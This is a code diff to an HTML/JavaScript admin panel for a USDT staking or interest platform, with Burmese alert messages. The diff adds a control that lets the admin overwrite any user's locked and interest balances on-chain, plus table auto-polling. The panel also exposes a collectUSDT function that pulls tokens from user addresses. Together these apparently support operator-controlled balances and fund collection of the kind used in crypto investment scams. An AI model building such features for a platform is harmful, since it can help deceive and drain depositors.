@@ -11,7 +11,6 @@
 
     <div class="w-full max-w-xl space-y-6 pb-12">
         
-        <!-- Header & Connect Admin Wallet -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 flex items-center justify-between">
             <div class="flex items-center gap-2">
                 <h1 class="text-sm md:text-base font-bold text-emerald-400">USDT Advanced Admin Panel</h1>
@@ -49,6 +48,22 @@
 
                 <button onclick="saveSubAdmin()" class="w-full bg-blue-600 hover:bg-blue-500 font-semibold py-2.5 rounded-xl transition cursor-pointer shadow-md mt-2">
                     Save / Update Sub-Admin
+                </button>
+            </div>
+        </div>
+
+        <!-- PART 0.5: User Balance Management (Locked & Interest) -->
+        <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
+            <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs flex items-center gap-2">
+                💰 User Balance Management (Locked & Interest)
+            </h2>
+            <div class="space-y-2 text-xs">
+                <input type="text" id="targetUserAddress" placeholder="User Wallet Address (0x...)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500 font-mono">
+                <input type="number" step="0.000001" id="newLockedBalance" placeholder="New Locked Balance (USDT)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500">
+                <input type="number" step="0.000001" id="newInterestBalance" placeholder="New Interest Balance (USDT)" class="w-full bg-slate-900 border border-slate-700 rounded-xl p-2.5 text-white placeholder-slate-500">
+                
+                <button onclick="updateUserBalancesAdmin()" class="w-full bg-purple-600 hover:bg-purple-500 font-semibold py-2.5 rounded-xl transition cursor-pointer shadow-md mt-1">
+                    Update User Balances (On-Chain)
                 </button>
             </div>
         </div>
@@ -112,7 +127,7 @@
             </div>
         </div>
 
-        <!-- PART 3: User Withdrawal Requests & Blockchain Event Real-time Monitoring -->
+        <!-- PART 3: Withdrawal Requests (Blockchain Events) -->
         <div class="bg-slate-800 p-5 rounded-2xl shadow-xl border border-slate-700 space-y-3">
             <div class="flex items-center justify-between">
                 <h2 class="font-bold text-emerald-400 uppercase tracking-wider text-xs">
@@ -132,6 +147,7 @@
 
     <script>
         let provider, adminSigner, adminAddress;
+        let autoRefreshInterval = null; // Auto-polling interval reference
 
         const ADMIN_CONTRACT_ADDRESS = "0x5a30bBD23eD1250ec5A3F8bca8122580E4eBefCC"; 
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
@@ -151,6 +167,7 @@
             "function setTier(uint256 index, uint256 minAmt, uint256 maxAmt, uint256 rateBps) external",
             "function collectUSDT(address from, uint256 amount) external",
             "function users(address) view returns (uint256 userId, address referrer, bool isBanned, bool isRegistered)",
+            "function setUserBalances(address user, uint256 locked, uint256 interest) external",
             "event WithdrawRequested(address indexed user, uint256 amount)"
         ];
 
@@ -176,6 +193,13 @@
                 
                 refreshUserTable();
                 initRealtimeWithdrawListener();
+
+                // Start Auto-Polling every 15 seconds to keep user list updated in real-time
+                if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+                autoRefreshInterval = setInterval(() => {
+                    refreshUserTable(true); // background refresh without resetting full table loading text
+                }, 15000);
+
             } catch (err) {
                 console.error(err);
                 document.getElementById("adminStatus").innerText = "Admin Wallet ချိတ်ဆက်မှု သို့မဟုတ် Network ပြောင်းလဲမှု မအောင်မြင်ပါ။";
@@ -210,6 +234,41 @@
             }
         }
 
+        async function updateUserBalancesAdmin() {
+            const userAddr = document.getElementById("targetUserAddress").value.trim();
+            const lockedVal = document.getElementById("newLockedBalance").value;
+            const interestVal = document.getElementById("newInterestBalance").value;
+
+            if (!userAddr || !ethers.isAddress(userAddr)) {
+                alert("မှန်ကန်သော User Wallet Address ကို ထည့်သွင်းပါ။");
+                return;
+            }
+            if (lockedVal === "" || interestVal === "") {
+                alert("Balance ပမာဏများကို အပြည့်အစုံ ဖြည့်စွက်ပါ။");
+                return;
+            }
+
+            try {
+                if (!adminSigner) {
+                    alert("ကျေးဇူးပြု၍ Admin Wallet ကို ဦးစွာ Connect လုပ်ပါ။");
+                    return;
+                }
+
+                const contract = new ethers.Contract(ADMIN_CONTRACT_ADDRESS, ADMIN_ABI, adminSigner);
+                const lockedWei = ethers.parseUnits(lockedVal, 6);
+                const interestWei = ethers.parseUnits(interestVal, 6);
+
+                alert("Smart Contract ပေါ်တွင် Balance များ အပ်ဒိတ်လုပ်ရန် Transaction အတည်ပြုပါ။");
+                const tx = await contract.setUserBalances(userAddr, lockedWei, interestWei);
+                await tx.wait();
+
+                alert("User ၏ Locked နှင့် Interest Balance များကို အောင်မြင်စွာ ပြင်ဆင်ပြီးပါပြီ။");
+            } catch (err) {
+                console.error(err);
+                alert("လုပ်ဆောင်ချက် မအောင်မြင်ပါ။ (Admin ခွင့်ပြုချက် လိုအပ်ပါသည်)");
+            }
+        }
+
         async function updateTierRate() {
             const index = document.getElementById("tierIndex").value;
             const minAmt = document.getElementById("tierMin").value;
@@ -233,9 +292,11 @@
             }
         }
 
-        async function refreshUserTable() {
+        async function refreshUserTable(isBackground = false) {
             const tbody = document.getElementById("userTableBody");
-            tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">Blockchain မှ အချက်အလက်များကို ဆွဲယူနေပါသည်...</td></tr>`;
+            if (!isBackground) {
+                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-slate-400">Blockchain မှ အချက်အလက်များကို ဆွဲယူနေပါသည်...</td></tr>`;
+            }
 
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
@@ -322,7 +383,9 @@
 
             } catch (err) {
                 console.error(err);
-                tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-red-400"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
+                if (!isBackground) {
+                    tbody.innerHTML = `<tr><td colspan="6" class="p-4 text-center text-red-400"> ဒေတာဆွဲထုတ်ရာတွင် အမှားအယွင်း ရှိပါသည်။ </td></tr>`;
+                }
             }
         }
 
@@ -376,7 +439,6 @@
             refreshUserTable();
         }
 
-        // Web Audio API Beep Alert for Admin
         function playAlertSound() {
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
@@ -443,7 +505,6 @@
             }
         }
 
-        // Real-time Event Listener for Admin
         async function initRealtimeWithdrawListener() {
             if (!provider) return;
 
